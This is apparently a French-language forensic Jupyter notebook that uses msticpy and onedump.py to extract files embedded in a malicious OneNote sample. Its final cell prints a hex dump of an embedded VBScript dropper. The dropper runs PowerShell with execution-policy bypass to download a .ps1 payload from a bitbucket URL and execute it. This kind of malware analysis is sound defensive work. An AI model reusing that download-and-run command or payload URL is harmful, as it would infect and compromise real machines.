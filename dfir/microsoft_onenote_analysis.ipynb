{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Analyse OneNote Microsoft File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<p style=''><font color='orange'><h3>Notebook setup completed with some warnings.</h3></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>One or more configuration items were missing or set incorrectly.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Please run the <i>Getting Started Guide for Azure Sentinel ML Notebooks</i> notebook. and the <a href='https://msticpy.readthedocs.io/en/latest/getting_started/msticpyconfig.html'>msticpy configuration guide</a>.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>This notebook may still run but with reduced functionality.</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "--2023-03-18 09:10:01--  https://raw.githubusercontent.com/DidierStevens/Beta/master/onedump.py\n",
      "Résolution de raw.githubusercontent.com (raw.githubusercontent.com)… 185.199.110.133, 185.199.111.133, 185.199.108.133, ...\n",
      "Connexion à raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443… connecté.\n",
      "requête HTTP transmise, en attente de la réponse… 200 OK\n",
      "Taille : 75940 (74K) [text/plain]\n",
      "Sauvegarde en : « onedump.py »\n",
      "\n",
      "     0K .......... .......... .......... .......... .......... 67% 4,64M 0s\n",
      "    50K .......... .......... ....                            100% 28,1M=0,01s\n",
      "\n",
      "2023-03-18 09:10:01 (6,37 MB/s) — « onedump.py » sauvegardé [75940/75940]\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from colorama import init, Fore, Back, Style\n",
    "from defang import defang\n",
    "import msticpy as mp\n",
    "import pandas as pd\n",
    "import msticpy.sectools as sectools\n",
    "import os\n",
    "\n",
    "mp.init_notebook(globals(), verbosity=0)\n",
    "ti = mp.TILookup()\n",
    "ioc_extractor = sectools.IoCExtract()\n",
    "\n",
    "# Chemin du fichier à analyser\n",
    "oneNoteFile = {}\n",
    "oneNoteFile['path'] = \"/home/secubian/Desktop/Cases/Microsoft_Office/onenot_2623024aba1ee994dcb82e937a8beb59abbebf51b6aa4cde8434bb56458b47da.one\"\n",
    "\n",
    "# Download requirement\n",
    "os.system('wget https://raw.githubusercontent.com/DidierStevens/Beta/master/onedump.py')\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Extraction des fichiers contenus dans un fichier OneNote\n",
    "\n",
    "Le dernier outil publié par Didier Stevens permet d'analyser des documents OneNote pour identifier tous les fichiers inclus."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "File: /home/secubian/Desktop/Cases/Microsoft_Office/onenot_2623024aba1ee994dcb82e937a8beb59abbebf51b6aa4cde8434bb56458b47da.one\n",
      " 1: 0x000117e8 Set  53657420 0x0000017d f6fc09e4cfb121172bc5428849ca110a\n",
      " 2: 0x00011ac0 .PNG 89504e47 0x00000296 81fd12c4ba87adca9e5e6622bb4db599\n",
      " 3: 0x000122d8 .PNG 89504e47 0x0000c9f8 f127c89687de91b2b242e3a5a73c39d4\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.system(f\"python3 onedump.py {oneNoteFile['path']}\")"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Analyse d'une section spécifique\n",
    "\n",
    "Une fois l'identification des fichiers présents effectuée, il est tout à fait possible d'en extraire leur contenu."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "File: /home/secubian/Desktop/Cases/Microsoft_Office/onenot_2623024aba1ee994dcb82e937a8beb59abbebf51b6aa4cde8434bb56458b47da.one\n",
      "00000000: 53 65 74 20 6F 62 6A 53  68 65 6C 6C 20 3D 20 43  Set objShell = C\n",
      "00000010: 72 65 61 74 65 4F 62 6A  65 63 74 28 22 57 53 63  reateObject(\"WSc\n",
      "00000020: 72 69 70 74 2E 53 68 65  6C 6C 22 29 0D 0A 0D 0A  ript.Shell\")....\n",
      "00000030: 27 20 44 6F 77 6E 6C 6F  61 64 20 61 6E 64 20 72  ' Download and r\n",
      "00000040: 75 6E 20 74 68 65 20 50  6F 77 65 72 53 68 65 6C  un the PowerShel\n",
      "00000050: 6C 20 73 63 72 69 70 74  0D 0A 6F 62 6A 53 68 65  l script..objShe\n",
      "00000060: 6C 6C 2E 52 75 6E 20 22  70 6F 77 65 72 73 68 65  ll.Run \"powershe\n",
      "00000070: 6C 6C 2E 65 78 65 20 2D  45 78 65 63 75 74 69 6F  ll.exe -Executio\n",
      "00000080: 6E 50 6F 6C 69 63 79 20  42 79 70 61 73 73 20 2D  nPolicy Bypass -\n",
      "00000090: 43 6F 6D 6D 61 6E 64 20  22 22 26 20 7B 20 49 6E  Command \"\"& { In\n",
      "000000A0: 76 6F 6B 65 2D 57 65 62  52 65 71 75 65 73 74 20  voke-WebRequest \n",
      "000000B0: 2D 55 72 69 20 27 68 74  74 70 73 3A 2F 2F 62 69  -Uri 'https://bi\n",
      "000000C0: 74 62 75 63 6B 65 74 2E  6F 72 67 2F 21 61 70 69  tbucket.org/!api\n",
      "000000D0: 2F 32 2E 30 2F 73 6E 69  70 70 65 74 73 2F 6D 6F  /2.0/snippets/mo\n",
      "000000E0: 75 6E 6D 65 69 6E 6C 79  6C 6F 2F 6A 71 4D 47 4D  unmeinlylo/jqMGM\n",
      "000000F0: 78 2F 32 37 66 63 30 61  31 33 35 38 64 38 63 32  x/27fc0a1358d8c2\n",
      "00000100: 36 36 39 32 36 32 61 30  62 65 64 36 62 61 65 38  669262a0bed6bae8\n",
      "00000110: 64 65 33 36 35 66 66 30  35 39 2F 66 69 6C 65 73  de365ff059/files\n",
      "00000120: 2F 62 6F 79 31 73 74 61  72 74 2E 70 73 31 27 20  /boy1start.ps1' \n",
      "00000130: 2D 4F 75 74 46 69 6C 65  20 27 43 3A 5C 55 73 65  -OutFile 'C:\\Use\n",
      "00000140: 72 73 5C 50 75 62 6C 69  63 5C 62 6F 79 31 2E 70  rs\\Public\\boy1.p\n",
      "00000150: 73 31 27 3B 20 43 3A 5C  55 73 65 72 73 5C 50 75  s1'; C:\\Users\\Pu\n",
      "00000160: 62 6C 69 63 5C 62 6F 79  31 2E 70 73 31 20 7D 22  blic\\boy1.ps1 }\"\n",
      "00000170: 22 22 2C 20 30 2C 20 54  72 75 65 0D 0A           \"\", 0, True..\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "embeddedFileID = 1\n",
    "os.system(f\"python3 onedump.py -s {embeddedFileID} {oneNoteFile['path']}\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "916dbcbb3f70747c44a77c7bcd40155683ae19c65e1c03b4aa3499c5328201f1"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
